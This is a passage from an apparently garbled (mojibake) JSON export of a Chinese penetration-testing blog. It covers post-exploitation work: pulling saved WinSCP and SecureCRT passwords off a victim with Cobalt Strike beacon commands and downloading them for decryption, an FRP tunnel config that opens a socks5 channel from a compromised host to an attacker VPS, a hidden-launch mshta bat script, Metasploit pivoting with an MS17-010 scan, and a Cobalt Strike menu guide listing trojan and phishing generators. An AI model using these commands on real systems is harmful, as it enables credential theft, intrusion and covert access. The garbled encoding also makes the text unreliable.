ã€‚ç¡®å®šWinscpå­˜å‚¨ä½ç½®é»˜è®¤æƒ…å†µä¸‹ï¼ŒWinscpé…ç½®ä¼šå­˜å‚¨åœ¨Windowså¯¹åº”çš„æ³¨å†Œè¡¨é¡¹ä¸‹ï¼ˆåŒ…æ‹¬äº†è¿æ¥çš„IPã€ç”¨æˆ·åã€å¯†ç Hashï¼‰ã€‚HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\å…·ä½“è§£å¯†è¿‡ç¨‹æŸ¥çœ‹Winscpé…ç½®çš„Windowsæ³¨å†Œè¡¨ï¼ˆæ³¨å†Œè¡¨é¡¹æ˜¯å›ºå®šçš„ï¼‰ï¼Œå¦‚æœæœ‰è¿æ¥ä¼šè¯ï¼Œå†æŒ‡å®šæŸ¥è¯¢è¿æ¥ä¸‹æ‰€ä¿å­˜çš„å¯†ç Hashã€‚1beacon&gt; shell reg query &quot;HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions&quot;2beacon&gt; shell reg query &quot;HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\root@192.168.144.128&quot;å°†æŸ¥åˆ°çš„ä¿¡æ¯æ‹·è´åˆ°æœ¬åœ°çš„winscppwd.exeè¿›è¡Œè§£å¯†ã€‚RDPç›´æ¥ç™»å½•ç›®æ ‡ï¼Œå¯¼å‡ºWinscpé…ç½®æ–‡ä»¶ï¼Œå¹¶ä¸‹è½½åˆ°æœ¬åœ°è¿›è¡Œè§£å¯†ã€‚(å¦‚æœæ‰¾åˆ°é…ç½®çš„iniæ–‡ä»¶ï¼Œç›´æ¥æŠŠå¯¹åº”æ–‡ä»¶downæœ¬åœ°è¿›è¡Œè§£å¯†å³å¯)é™„è„šæœ¬å·¥å…·ListInstalledPrograms.ps1winscppwd.exe","categories":[{"name":"å†…ç½‘å¯†ç æœé›†","slug":"å†…ç½‘å¯†ç æœé›†","permalink":"https://payloads.cn/categories/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86/"}],"tags":[{"name":"è§£å¯†å®¢æˆ·ç«¯","slug":"è§£å¯†å®¢æˆ·ç«¯","permalink":"https://payloads.cn/tags/%E8%A7%A3%E5%AF%86%E5%AE%A2%E6%88%B7%E7%AB%AF/"}]},{"title":"è§£å¯†SecureCRTå®¢æˆ·ç«¯ä¸­ä¿å­˜çš„å¯†ç hash","slug":"è§£å¯†SecureCRTå®¢æˆ·ç«¯ä¸­ä¿å­˜çš„å¯†ç hash","date":"2019-12-04T14:08:30.000Z","updated":"2019-12-11T16:23:39.049Z","comments":true,"path":"2019/1204/decrypt-the-password-hash-stored-in-securecrt-client.html","link":"","permalink":"https://payloads.cn/2019/1204/decrypt-the-password-hash-stored-in-securecrt-client.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚â€”â€”AnonySechttps://payloads.cnå‰è¨€SecureCRTæ˜¯è¿ç»´äººå‘˜å¸¸ç”¨çš„ç®¡ç†å·¥å…·ã€‚ä½†ç”±äºæŸäº›è¿ç»´äººå‘˜çš„å®‰å…¨æ„è¯†ä¸é«˜ï¼Œå¹³æ—¶å¾ˆå¯èƒ½ä¼šæŠŠSSHçš„è¿æ¥å¯†ç éƒ½ä¿å­˜åœ¨é‡Œé¢ï¼Œè¿™å°±ç»™äº†æ¸—é€äººå‘˜å¯ä¹˜ä¹‹æœºï¼Œä¸ºåç»­è·¨å¹³å°æ¨ªå‘ç§»åŠ¨åšäº†å‡†å¤‡ã€‚è€Œæˆ‘ä»¬çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†è§£å¯†ä¿å­˜åœ¨SecureCRTä¸­çš„è¿™äº›SHHè¿æ¥å¯†ç ï¼Œå¹¶é€šè¿‡è¿™ç§æ–¹å¼å®ç°Windowsåˆ°Linuxä¹‹é—´çš„å¿«é€Ÿæ¨ªå‘æ¸—é€ã€‚æ‰€æœ‰æ“ä½œå…¨éƒ¨åœ¨ç®¡ç†å‘˜æƒé™ä¸‹è¿›è¡Œï¼Œè§£å¯†è„šæœ¬ä»…é™äº SecureCRT 7.x ä»¥ä¸‹ç‰ˆæœ¬ï¼Œé«˜ç‰ˆæœ¬éœ€è¦ä½¿ç”¨æ–‡ç« æœ«çš„æ–¹æ³•ã€‚å¦‚æœSecureCRTæœ‰å¯åŠ¨å¯†ç ï¼ŒConfigåŠ å¯†äº†ï¼Œå°±ä¸è¦æäº†ã€‚ç¡®å®šç›®æ ‡SecureCRTçš„è¯¦ç»†ç‰ˆæœ¬æƒ³åŠæ³•ç¡®å®šSecureCRTçš„è¯¦ç»†ç‰ˆæœ¬ï¼Œé€šè¿‡powershellè„šæœ¬æå®šï¼Œæˆ–è€…ç›´æ¥RDPç™»å½•è¿æ¥æŸ¥è¯¢ç­‰ ã€Œç»¿è‰²ç‰ˆæ— å®‰è£…è®°å½•ã€ã€‚å‘ç°ç›®æ ‡æ‰€ç”¨çš„è¯¦ç»†ç‰ˆæœ¬ä¸º 7.1.1ï¼ˆbuild 264ï¼‰ã€‚1beacon&gt; powershell-import &#x2F;Users&#x2F;anonysec&#x2F;ListInstalledPrograms.ps12beacon&gt; powershell Get-listç¡®å®šSecureCRTé…ç½®æ–‡ä»¶ç›®å½•ä¸‹çš„Sessionsç›®å½•é»˜è®¤æƒ…å†µä¸‹ï¼ŒSecureCRTçš„Configç›®å½•è·¯å¾„ä¸ºï¼š%APPDATA%\\VanDyke\\Config\\Sessions\\å¦‚æœæ— æ³•ç¡®å®šè·¯å¾„ï¼Œå¯ä»¥é€šè¿‡å›¾å½¢ç•Œé¢åœ¨SecureCRTèœå•çš„å…¨å±€é€‰é¡¹ä¸­æ¥ç¡®è®¤ã€‚Sessionsç›®å½•ä¸‹çš„æ¯ä¸ªiniæ–‡ä»¶éƒ½ä¼šä»¥è¿æ¥çš„IPæˆ–åŸŸåæ¥å‘½åã€‚1beacon&gt;shell dir %APPDATA%\\VanDyke\\Config\\Sessions\\æ‹·è´ä¸‹è½½Sessionsç›®å½•çš„iniæ–‡ä»¶ç›´æ¥åˆ°Sessionsç›®å½•ä¸‹è½½iniæ–‡ä»¶å¯èƒ½ä¼šæœ‰é—®é¢˜ï¼ˆåº”è¯¥ç¨‹åºå ç”¨ï¼‰ï¼Œå³ä½¿ä¸‹è½½ä¸‹æ¥ï¼Œåˆ°æœ¬åœ°å¯èƒ½æ— æ³•è§£å¯†ã€‚æ‰€ä»¥ï¼Œå…ˆç”¨Invoke-NinjaCopy.ps1è„šæœ¬æŠŠiniæ–‡ä»¶å…ˆcopyåˆ°å…¶ä»–ç›®å½•ï¼Œç„¶åå†å»ä¸‹è½½ã€‚1beacon&gt; powershell-import &#x2F;Users&#x2F;anonysec&#x2F;Invoke-NinjaCopy.ps12beacon&gt; powershell Invoke-NinjaCopy -Path &quot;C:\\Users\\r00t\\AppData\\Roaming\\VanDyke\\Config\\Sessions\\192.168.144.128.ini&quot; -LocalDestination &quot;c:\\windows\\temp\\192.168.144.128.ini&quot;3beacon&gt; shell dir c:\\windows\\temp\\192.168.144.128.ini 4beacon&gt; download c:\\windows\\temp\\192.168.144.128.iniè„šæœ¬è§£å¯†Sessionå°†ä¸‹è½½çš„iniæ–‡ä»¶æ‹·è´åˆ°æœ¬åœ°ï¼Œåˆ©ç”¨è„šæœ¬è¿›è¡Œè§£å¯†ã€‚ç¯å¢ƒï¼špython 2.7ã€pycryptoåº“ã€‚æ­¤å¤„è§£å¯†è„šæœ¬ä»…é™äº SecureCRT 7.x ä»¥ä¸‹çš„ç‰ˆæœ¬ï¼1sudo pip2 install pycrypto1python SecureCRT-decryptpass.py 192.168.144.128.iniSecureCRTé«˜ç‰ˆæœ¬è§£å†³å¦‚æœç›®æ ‡çš„SecureCRTç‰ˆæœ¬è¾ƒé«˜ï¼Œæ— æ³•è¿›è¡Œè§£å¯†è¯¥æ€ä¹ˆåŠï¼Ÿæ­¤å¤„ä»¥ 8.5.3ï¼ˆX64 build 1867ï¼‰ä¸ºä¾‹ï¼Œç›´æ¥æŠŠå¯¹åº”%APPDATA%\\VanDyke\\Config\\ æ•´ä¸ªç›®å½•æ‹·è´åˆ°æœ¬æœºSecureCRTçš„Configç›®å½•ä¸‹ï¼Œç„¶åç›´æ¥è¿æ¥ã€‚ç›®æ ‡SecureCRTç‰ˆæœ¬ä¸æœ¬åœ°ç‰ˆæœ¬éœ€ä¸€è‡´ï¼Œå¦åˆ™å¯èƒ½ä¼šå‡ºç°é—®é¢˜ã€‚é™„è„šæœ¬ListInstalledPrograms.ps1Invoke-NinjaCopy.ps1SecureCRT-decryptpass.py","categories":[{"name":"å†…ç½‘å¯†ç æœé›†","slug":"å†…ç½‘å¯†ç æœé›†","permalink":"https://payloads.cn/categories/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86/"}],"tags":[{"name":"è§£å¯†å®¢æˆ·ç«¯","slug":"è§£å¯†å®¢æˆ·ç«¯","permalink":"https://payloads.cn/tags/%E8%A7%A3%E5%AF%86%E5%AE%A2%E6%88%B7%E7%AB%AF/"}]},{"title":"Frpå†…ç½‘ç©¿é€å®æˆ˜","slug":"Frpå†…ç½‘ç©¿é€å®æˆ˜","date":"2019-12-04T14:07:28.000Z","updated":"2019-12-05T15:07:01.085Z","comments":true,"path":"2019/1204/frp-intranet-penetration-combat.html","link":"","permalink":"https://payloads.cn/2019/1204/frp-intranet-penetration-combat.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚â€”â€”AnonySechttps://payloads.cnå‰è¨€å®æˆ˜ä¸­ï¼Œå½“é€šè¿‡æŸç§æ–¹å¼æ‹¿ä¸‹ç›®æ ‡æœºå™¨æƒé™æ—¶ï¼Œå‘ç°è¯¥æœºå™¨å¯å‡ºç½‘ã€‚æ­¤æ—¶ä¸ºäº†å†…ç½‘æ¨ªå‘æ¸—é€ä¸å›¢é˜Ÿé—´çš„ååŒä½œæˆ˜ï¼Œå¯ä»¥åˆ©ç”¨Frpåœ¨è¯¥æœºå™¨ä¸VPSä¹‹é—´å»ºç«‹ä¸€æ¡â€œä¸“å±é€šé“â€ï¼Œå¹¶å€ŸåŠ©è¿™æ¡é€šé“è¾¾åˆ°å†…ç½‘ç©¿é€çš„æ•ˆæœã€‚å®æˆ˜ä¸­æ›´å¤šæ—¶å€™ä¾é  Socks5 ã€‚æ›´å¤šè¯¦ç»†ä½¿ç”¨æ–¹æ³•ï¼Œå¯æŸ¥çœ‹å®˜æ–¹Githubï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚https://github.com/fatedier/frp/å‰æœŸå‡†å¤‡å…ˆå‡†å¤‡ä¸€å°VPSä¸åŸŸåã€‚å› æŸç§æƒ…å†µä¼šæ›´æ¢VPSåœ°å€ï¼Œä¸ºäº†å‡å°‘æ›´æ”¹frpé…ç½®æ–‡ä»¶çš„æ¬¡æ•°ï¼Œæ‰€ä»¥åšåŸŸåæ³›è§£æã€‚è‹¥æ›´æ¢VPSï¼Œç›´æ¥ç¼–è¾‘åŸŸåè§£æåœ°å€å³å¯ã€‚ä¸‹è½½åœ°å€Frpä¸‹è½½åœ°å€ [è·¨å¹³å°ï¼Œå®æˆ˜ä¸­æ ¹æ®ç›®æ ‡æœºç‰ˆæœ¬é€‰æ‹©ä¸‹è½½]https://github.com/fatedier/frp/releasesé…ç½®æ–‡ä»¶æœåŠ¡ç«¯1#é€šç”¨é…ç½®æ®µ2[common]3#frpæœåŠ¡ç«¯ç›‘å¬ [VPS]4bind_addr = 0.0.0.05#frpæœåŠ¡å™¨ç›‘å¬ç«¯å£ [å®æˆ˜ä¸­å¯ä»¥ç”¨ä¸€äº›é€šé€æ€§è¾ƒå¥½çš„ç«¯å£]6bind_port = 700778#æœåŠ¡ç«¯Webæ§åˆ¶é¢æ¿ç™»å½•ç«¯å£ [é€šè¿‡æ§åˆ¶é¢æ¿ï¼Œå¯ä»¥å®æ—¶äº†è§£åˆ°æ•°æ®æ”¶å‘æƒ…å†µã€‚å®æˆ˜ä¸­ç”¨å¤„ä¸å¤§]9dashboard_port = 660910#æœåŠ¡ç«¯Webæ§åˆ¶é¢æ¿ç”¨æˆ·åä¸å¯†ç  [å¼ºå£ä»¤]11dashboard_user = SuperMan12dashboard_pwd = WC3pvjmh2tt81314#æ—¥å¿—è¾“å‡ºä½ç½®ï¼Œæ‰€æœ‰çš„æ—¥å¿—ä¿¡æ¯éƒ½æ”¾åˆ°å½“å‰ç›®å½•ä¸‹çš„frps.logæ–‡ä»¶ä¸­15log_file = ./frps.log16#æ—¥å¿—è®°å½•ç­‰çº§ï¼Œæœ‰traceã€debugã€infoã€warnã€error,é€šå¸¸æƒ…å†µä¸‹ä¸ºinfo17log_level = info 18#æ—¥å¿—ä¿ç•™æ—¶é—´19log_max_days = 32021#éªŒè¯å‡­æ®ï¼ŒæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯çš„å‡­æ®å¿…é¡»ä¸€æ ·æ‰èƒ½è¿æ¥22auth_token = E0iQEBOdoJeh23#å¯ç”¨ç‰¹æƒæ¨¡å¼ï¼Œä»v0.10.0ç‰ˆæœ¬å¼€å§‹é»˜è®¤å¯ç”¨ç‰¹æƒæ¨¡å¼ [ç‰¹æƒæ¨¡å¼ä¸‹ï¼Œå®¢æˆ·ç«¯æ›´æ”¹é…ç½®æ— éœ€æ›´æ–°æœåŠ¡ç«¯] 24privilege_mode = true25#ç‰¹æƒæ¨¡å¼Token [å¼ºå£ä»¤ï¼Œå»ºè®®éšæœºç”Ÿæˆ]26privilege_token = kukezkHC8R1H27#ç‰¹æƒæ¨¡å¼å…è®¸åˆ†é…çš„ç«¯å£ [é¿å…ç«¯å£è¢«æ»¥ç”¨] 28privilege_allow_ports = 4000-500002930#å¿ƒè·³æ£€æµ‹è¶…æ—¶æ—¶é•¿ 31heartbeat_timeout = 303233#æ¯ä¸ªä»£ç†å¯ä»¥è®¾ç½®çš„è¿æ¥æ± ä¸Šé™34max_pool_count = 203536#å£ä»¤è®¤è¯è¶…æ—¶æ—¶é—´ï¼Œä¸€èˆ¬ä¸ç”¨æ”¹37authentication_timeout = 9003839#æŒ‡å®šå­åŸŸåï¼Œåç»­å°†å…¨éƒ¨ç”¨åŸŸåçš„å½¢å¼è¿›è¡Œè®¿é—® [ç‰¹æƒæ¨¡å¼éœ€ä¸‹å°† *.xxxx.online è§£æåˆ°å¤–ç½‘VPSä¸Šï¼Œå³åŸŸåæ³›è§£æ] 40subdomain_host = xxxx.onlineå®¢æˆ·ç«¯1#é€šç”¨é…ç½®æ®µ2[common]3#frpæœåŠ¡ç«¯IPæˆ–åŸŸå [å®æˆ˜ä¸­ä¸€èˆ¬éƒ½ä¼šç›´æ¥ç”¨åŸŸå] 4server_addr = frp.xxxx.online5#frpæœåŠ¡å™¨ç«¯å£6server_port = 700778#æˆæƒtokenï¼Œæ­¤å¤„å¿…é¡»ä¸æœåŠ¡ç«¯ä¿æŒä¸€è‡´ï¼Œå¦åˆ™æ— æ³•å»ºç«‹è¿æ¥ 9auth_token = E0iQEBOdoJeh10#å¯ç”¨ç‰¹æƒæ¨¡å¼ [ç‰¹æƒæ¨¡å¼ä¸‹æœåŠ¡ç«¯æ— éœ€é…ç½®] 11privilege_mode = true12#ç‰¹æƒæ¨¡å¼ token,åŒæ ·è¦ä¸æœåŠ¡ç«¯å®Œå…¨ä¿æŒä¸€è‡´ 13privilege_token = kukezkHC8R1H1415#å¿ƒè·³æ£€æŸ¥é—´éš”ä¸è¶…æ—¶æ—¶é—´16heartbeat_interval = 10 17heartbeat_timeout = 301819#å¯ç”¨åŠ å¯† [é€šä¿¡å†…å®¹åŠ å¯†ä¼ è¾“ï¼Œæœ‰æ•ˆé˜²æ­¢æµé‡è¢«æ‹¦æˆª]20use_encryption = true21#å¯ç”¨å‹ç¼© [ä¼ è¾“å†…å®¹è¿›è¡Œå‹ç¼©ï¼Œæœ‰æ•ˆå‡å°ä¼ è¾“çš„ç½‘ç»œæµé‡ï¼ŒåŠ å¿«æµé‡è½¬å‘é€Ÿåº¦ï¼Œä½†ä¼šé¢å¤–æ¶ˆè€—ä¸€äº›CPUèµ„æº]22use_compression = true2324#è¿æ¥æ•°é‡ 25pool_count = 202627#å†…ç½‘ç©¿é€é€šå¸¸ç”¨socks528[socks5]29type = tcp30#è¿æ¥VPSå†…ç½‘ç©¿é€çš„è¿œç¨‹è¿æ¥ç«¯å£31remote_port = 906632#ä½¿ç”¨æ’ä»¶socks5ä»£ç†33plugin = socks534#socks5è¿æ¥å£ä»¤ [æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œé…ç½®]35#plugin_user = SuperMan36#plugin_passwd = ZBO0McQe6mE1æ‰§è¡Œéƒ¨ç½²æœåŠ¡ç«¯SSHè¿æ¥åˆ°VPSä¸Šï¼Œåå°å¯åŠ¨frpæœåŠ¡ç«¯ã€‚1root@Ubuntu:~# cd tools/frp/2root@Ubuntu:~/tools/frp# nohup ./frps -c frps.ini &amp;3root@Ubuntu:~/tools/frp# jobs -l4root@Ubuntu:~/tools/frp# cat frps.logå®¢æˆ·ç«¯å°†frpc.exeä¸frpc.iniä¼ åˆ°ç›®æ ‡æœºçš„åŒä¸€ç›®å½•ä¸‹ï¼Œç›´æ¥è¿è¡Œã€‚å½“frpå®¢æˆ·ç«¯å¯åŠ¨åï¼Œæ˜¯å¦æˆåŠŸè¿æ¥ï¼Œéƒ½ä¼šåœ¨frpæœåŠ¡ç«¯æ—¥å¿—ä¸­æŸ¥çœ‹åˆ°ã€‚ä½†å¦‚æœç›´æ¥åœ¨ç›®æ ‡æœºçš„Beaconä¸­å¯åŠ¨frpå®¢æˆ·ç«¯ï¼Œä¼šæŒç»­æœ‰æ—¥å¿—è¾“å‡ºï¼Œå¹¶å¹²æ‰°è¯¥pidä¸‹çš„å…¶ä»–æ“ä½œï¼Œæ‰€ä»¥å¯ç»“åˆexecuteåœ¨ç›®æ ‡æœºæ— è¾“å‡ºæ‰§è¡Œç¨‹åºã€‚1beacon&gt; sleep 102beacon&gt; execute c:&#x2F;frpc.exe -c c:&#x2F;frpc.ini3beacon&gt; shell netstat -ano |findstr 7007æˆ–è€…ï¼Œåˆ›å»ºåå°è¿è¡Œçš„batè„šæœ¬ã€‚1@echo off 2if \"%1\" == \"h\" goto begin 3mshta vbscript:createobject(\"wscript.shell\").run(\"%~nx0 h\",0)(window.close)&amp;&amp;exit 4:begin 5c:\\frpc.exe -c c:\\frpc.iniå·¥å…·ç©¿é€Metasploitå½“â€œä¸“å±é€šé“â€æ‰“é€šåï¼Œå¯ç›´æ¥åœ¨msfä¸­æŒ‚è¯¥ä»£ç†ã€‚å› ä¸ºmsfçš„æ¨¡å—è¾ƒå¤šï¼Œæ‰€ä»¥åœ¨å†…ç½‘æ¨ªå‘ç§»åŠ¨ä¸­æ›´æ˜¯ä¸€æŠŠåˆ©å™¨ã€‚ [è‹¥socks5è®¾ç½®å£ä»¤ï¼Œå¯ç»“åˆproxychains]1# sudo msfconsole -q2msf5 &gt; setg proxies socks5:frp.xxxx.online:90663msf5 &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_0104msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set threads 105msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 192.168.144.1786msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; runWindowsWindowsä¸­å¯ç»“åˆProxifierã€SSTapç­‰å·¥å…·ï¼Œå¯è®¾ç½®socks5å£ä»¤ï¼Œä»¥æ­¤è¾¾åˆ°ç”¨windowsæ¸—é€å·¥å…·æ¨ªå‘ç©¿é€çš„æ•ˆæœã€‚å°ç»“Frpçš„ç”¨æ³•æ¯”è¾ƒçµæ´»ä¸”è¿è¡Œç¨³å®šã€‚å¦‚ å¯å°†frpæœåŠ¡ç«¯æŒ‚åœ¨â€œè‚‰é¸¡â€ä¸Šï¼Œä»¥è¾¾åˆ°éšè”½æ€§ï¼Œä¹Ÿå¯å°†å®¢æˆ·ç«¯åšæˆæœåŠ¡è‡ªå¯çš„å½¢å¼ç­‰ï¼Œå®æˆ˜ä¸­å¯è‡ªç”±å‘æŒ¥ã€‚","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"å†…ç½‘ç©¿é€","slug":"å†…ç½‘ç©¿é€","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"CobaltStrikeåŸºæœ¬åŠŸèƒ½ä¸ä½¿ç”¨","slug":"CobaltStrikeåŸºæœ¬åŠŸèƒ½ä¸ä½¿ç”¨","date":"2019-12-04T10:47:29.000Z","updated":"2019-12-10T13:10:35.257Z","comments":true,"path":"2019/1204/cobaltstrike-basic-functions-and-use.html","link":"","permalink":"https://payloads.cn/2019/1204/cobaltstrike-basic-functions-and-use.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚â€”â€”AnonySechttps://payloads.cnå‰è¨€Cobalt Strike ä¸€æ¬¾ä»¥Metasploitä¸ºåŸºç¡€çš„GUIæ¡†æ¶å¼æ¸—é€æµ‹è¯•å·¥å…·ï¼Œé›†æˆäº†ç«¯å£è½¬å‘ã€æœåŠ¡æ‰«æï¼Œè‡ªåŠ¨åŒ–æº¢å‡ºï¼Œå¤šæ¨¡å¼ç«¯å£ç›‘å¬ï¼Œexeã€powershellæœ¨é©¬ç”Ÿæˆç­‰ã€‚é’“é±¼æ”»å‡»åŒ…æ‹¬ï¼šç«™ç‚¹å…‹éš†ï¼Œç›®æ ‡ä¿¡æ¯è·å–ï¼Œjavaæ‰§è¡Œï¼Œæµè§ˆå™¨è‡ªåŠ¨æ”»å‡»ç­‰ã€‚Cobalt Strike ä¸»è¦ç”¨äºå›¢é˜Ÿä½œæˆ˜ï¼Œå¯è°“æ˜¯å›¢é˜Ÿæ¸—é€ç¥å™¨ï¼Œèƒ½è®©å¤šä¸ªæ”»å‡»è€…åŒæ—¶è¿æ¥åˆ°å›¢ä½“æœåŠ¡å™¨ä¸Šï¼Œå…±äº«æ”»å‡»èµ„æºä¸ç›®æ ‡ä¿¡æ¯å’Œsessionsã€‚Cobalt Strike ä½œä¸ºä¸€æ¬¾ååŒAPTå·¥å…·ï¼Œé’ˆå¯¹å†…ç½‘çš„æ¸—é€æµ‹è¯•å’Œä½œä¸ºaptçš„æ§åˆ¶ç»ˆç«¯åŠŸèƒ½ï¼Œä½¿å…¶å˜æˆä¼—å¤šAPTç»„ç»‡çš„é¦–é€‰ã€‚åŸºæœ¬åŠŸèƒ½å®‰è£…Cobalt Strike åˆ†ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ï¼Œå¯åˆ†å¸ƒå¼æ“ä½œã€ååŒä½œæˆ˜ã€‚æœåŠ¡å™¨ç«¯åªèƒ½è¿è¡Œåœ¨Linuxç³»ç»Ÿä¸­ï¼Œå¯æ­å»ºåœ¨VPSä¸Šã€‚æœåŠ¡ç«¯æœåŠ¡ç«¯å…³é”®çš„æ–‡ä»¶æ˜¯teamserverä»¥åŠcobaltstrike.jarï¼Œå°†è¿™ä¸¤ä¸ªæ–‡ä»¶æ”¾åˆ°æœåŠ¡å™¨ä¸ŠåŒä¸€ä¸ªç›®å½•ï¼Œç„¶åè¿è¡Œï¼š1chmod +x teamserver2./teamserver 10.11.42.202 test123 3# æœåŠ¡ç«¯çœŸå®IP(ä¸èƒ½ä½¿ç”¨0.0.0.0æˆ–127.0.0.1)å’Œè¿æ¥å¯†ç å®¢æˆ·ç«¯å®¢æˆ·ç«¯åœ¨Windowsã€Linuxã€Macä¸‹éƒ½å¯ä»¥è¿è¡Œ (éœ€è¦é…ç½®å¥½Javaç¯å¢ƒ)ã€‚å¯åŠ¨Cobalt Strikeå®¢æˆ·ç«¯ï¼Œè¾“å…¥æœåŠ¡ç«¯çš„IPä»¥åŠç«¯å£ã€è¿æ¥å¯†ç ï¼Œç”¨æˆ·åå¯ä»¥ä»»æ„è®¾ç½®ã€‚åœ¨æ§åˆ¶å°æ‰€æœ‰æ“ä½œæŒ‡ä»¤éƒ½ä¼šè¢«è®°å½•ä¿ç•™åœ¨Cobalt Strikeç›®å½•logsä¸‹ã€‚å‚æ•°è¯¦æƒ…Cobalt Strike1New Connection #æ–°çš„è¿æ¥(æ”¯æŒè¿æ¥å¤šä¸ªæœåŠ¡å™¨ç«¯)2Preferences #åå¥½è®¾ç½®(è®¾ç½®Cobal Strikeç•Œé¢ã€æ§åˆ¶å°ã€ä»¥åŠè¾“å‡ºæŠ¥å‘Šæ ·å¼ã€TeamServerè¿æ¥è®°å½•ç­‰)3Visualization #çª—å£è§†å›¾æ¨¡å¼(å±•ç¤ºè¾“å‡ºç»“æœçš„å½¢å¼)4VPN Interfaces #VPNæ¥å…¥5Listenrs #ç›‘å¬å™¨(åˆ›å»ºListener)6Script Manager #è„šæœ¬ç®¡ç†7Close #å…³é—­View1Applications #åº”ç”¨(æ˜¾ç¤ºå—å®³è€…æœºå™¨çš„åº”ç”¨ä¿¡æ¯)2Credentials #å‡­è¯(é€šè¿‡hashdumpæˆ–MimikatzæŠ“å–è¿‡çš„å¯†ç éƒ½ä¼šå‚¨å­˜åœ¨è¿™é‡Œ)3Downloads #ä¸‹è½½æ–‡ä»¶4Event Log #äº‹ä»¶æ—¥å¿—(ä¸»æœºä¸Šçº¿è®°å½•ä»¥åŠå›¢é˜Ÿåä½œèŠå¤©è®°å½•)5Keystrokes #é”®ç›˜è®°å½•6Proxy Pivots #ä»£ç†æ¨¡å—7Screenshots #æˆªå›¾8Script Console #è„šæœ¬æ§åˆ¶å°(å¯ä»¥åŠ è½½å„ç§è„šæœ¬ï¼Œå¢å¼ºåŠŸèƒ½https://github.com/rsmudge/cortana-scripts)9Targets #æ˜¾ç¤ºç›®æ ‡ä¸»æœº10Web Log #Webæ—¥å¿—AttacksPackages1HTML Application #ç”Ÿæˆæ¶æ„çš„HTAæœ¨é©¬æ–‡ä»¶2MS Office Macro #ç”Ÿæˆofficeå®ç—…æ¯’æ–‡ä»¶3Payload Generator #ç”Ÿæˆå„ç§è¯­è¨€ç‰ˆæœ¬çš„payload4USB/CD AutoPlay #ç”Ÿæˆåˆ©ç”¨è‡ªåŠ¨æ’­æ”¾è¿è¡Œçš„æœ¨é©¬æ–‡ä»¶5Windows Dropper #æ†ç»‘å™¨ï¼Œèƒ½å¤Ÿå¯¹æ–‡æ¡£ç±»è¿›è¡Œæ†ç»‘6Windows Executable #ç”Ÿæˆå¯æ‰§è¡ŒPayload7Windows Executable(S) #æŠŠåŒ…å«payload,Stagelessç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶(åŒ…å«å¤šæ•°åŠŸèƒ½)Web Drive-by1Manage #å¯¹å¼€å¯çš„webæœåŠ¡è¿›è¡Œç®¡ç†2Clone Site #å…‹éš†ç½‘ç«™(å¯è®°å½•å—å®³è€…æäº¤çš„æ•°æ®)3Host File #æä¾›Webä»¥ä¾›ä¸‹è½½æŸæ–‡ä»¶4Scripted Web Delivery #æä¾›WebæœåŠ¡ï¼Œä¾¿äºä¸‹è½½å’Œæ‰§è¡ŒPowerShell Payloadï¼Œç±»ä¼¼äºMetasploitçš„web_delivery 5Signed Applet Attack #å¯åŠ¨ä¸€ä¸ªWebæœåŠ¡ä»¥æä¾›è‡ªç­¾åJava Appletçš„è¿è¡Œç¯å¢ƒ6Smart Applet Attack #è‡ªåŠ¨æ£€æµ‹Javaç‰ˆæœ¬å¹¶åˆ©ç”¨å·²çŸ¥çš„exploitsç»•è¿‡security7System Profiler #ç”¨æ¥è·å–ä¸€äº›ç³»ç»Ÿä¿¡æ¯ï¼Œæ¯”å¦‚ç³»ç»Ÿç‰ˆæœ¬ï¼ŒFlashç‰ˆæœ¬ï¼Œæµè§ˆå™¨ç‰ˆæœ¬ç­‰Reporting10. Activity report #æ´»åŠ¨æŠ¥å‘Š21. Hosts report #ä¸»æœºæŠ¥å‘Š32. Indicators of Compromise #å¨èƒæŠ¥å‘Š43. Sessions report #ä¼šè¯æŠ¥å‘Š54. Social engineering report #ç¤¾ä¼šå·¥ç¨‹å­¦æŠ¥å‘Š65. Tactics, Techniques, and Procedures #ç­–ç•¥ã€æŠ€å·§å’Œç¨‹åº 7Reset Data #é‡ç½®æ•°æ®8Export Data #å¯¼å‡ºæ•°æ®Help1Homepage #å®˜æ–¹ä¸»é¡µ2Support #æŠ€æœ¯æ”¯æŒ3Arsenal #å¼€å‘è€…4System information #ç‰ˆæœ¬ä¿¡æ¯5About #å…³äºå³é”®èœå•Access1Dump Hashes #è·å–hash2Elevate #ææƒ3Golden Ticket #ç”Ÿæˆé»„é‡‘ç¥¨æ®æ³¨å…¥å½“å‰ä¼šè¯4Make token #å‡­è¯è½¬æ¢5Run Mimikatz #è¿è¡Œ Mimikatz 6Spawn As #ç”¨å…¶ä»–ç”¨æˆ·ç”ŸæˆCobalt Strikeä¾¦å¬å™¨Explore1Browser Pivot #åŠ«æŒç›®æ ‡æµè§ˆå™¨è¿›ç¨‹2Desktop(VNC) #æ¡Œé¢äº¤äº’3File Browser 